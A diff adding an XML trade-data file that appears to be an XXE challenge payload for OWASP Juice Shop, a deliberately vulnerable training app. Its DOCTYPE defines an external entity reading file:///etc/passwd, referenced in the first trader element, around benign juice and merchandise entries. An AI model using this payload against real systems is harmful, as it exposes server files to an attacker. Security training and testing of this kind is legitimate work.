@@ -1,0 +1,40 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!DOCTYPE foo [<!ELEMENT foo ANY >
+        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+
+<trades>
+    <metadata>
+        <name>Apple Juice</name>
+        <trader>
+            <foo>&xxe;</foo>
+            <name>Great Orwell</name>
+        </trader>
+        <units>1500</units>
+        <price>106</price>
+        <name>Lemon Juice</name>
+        <trader>
+            <name>Great Orwell</name>
+        </trader>
+        <units>4500</units>
+        <price>195</price>
+        <name>Quince Juice</name>
+        <trader>
+            <name>Great Orwell</name>
+        </trader>
+        <units>400</units>
+        <price>95</price>
+        <name>OWASP Juice Shop Logo (3D-printed)</name>
+        <trader>
+            <name>Great Orwell</name>
+        </trader>
+        <units>20</units>
+        <price>500</price>
+        <name>OWASP Juice Shop Hoodie</name>
+        <trader>
+            <name>Great Orwell</name>
+        </trader>
+        <units>45</units>
+        <price>140</price>
+    </metadata>
+</trades>
